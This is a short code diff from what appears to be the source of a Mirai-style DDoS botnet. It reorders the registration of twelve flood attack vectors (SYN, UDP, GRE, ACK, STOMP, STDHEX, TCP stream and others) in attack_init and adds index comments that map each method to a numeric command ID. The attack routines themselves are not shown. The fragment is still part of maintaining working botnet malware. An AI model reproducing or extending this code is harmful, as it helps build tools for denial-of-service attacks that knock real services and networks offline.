@@ -25,18 +25,18 @@ BOOL attack_init(void)
 {
     int i;
 
-    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
-    add_attack(ATK_VEC_UDP_FLOOD, (ATTACK_FUNC)attack_udp_thread);
-    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_method_nudp);
-    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
-    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
-    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
-    add_attack(ATK_VEC_SACK2, (ATTACK_FUNC)attack_tcp_sack2);
-    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);
-    add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_udp_stdhex);
-    add_attack(ATK_VEC_STREAM, (ATTACK_FUNC)attack_tcpstream);
-    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket);
-    add_attack(ATK_VEC_TCPWRA, (ATTACK_FUNC)attack_wraflood);
+    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn); // 0
+    add_attack(ATK_VEC_UDP_FLOOD, (ATTACK_FUNC)attack_udp_thread); // 1
+    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_method_nudp); // 2
+    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse); // 3
+    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip); // 4 
+    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack); // 5
+    add_attack(ATK_VEC_SACK2, (ATTACK_FUNC)attack_tcp_sack2); // 6
+    add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_udp_stdhex); // 7
+    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket); // 8
+    add_attack(ATK_VEC_STREAM, (ATTACK_FUNC)attack_tcpstream); // 9
+    add_attack(ATK_VEC_TCPWRA, (ATTACK_FUNC)attack_wraflood); // 10
+    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp); // 11
 
     return TRUE;
 }
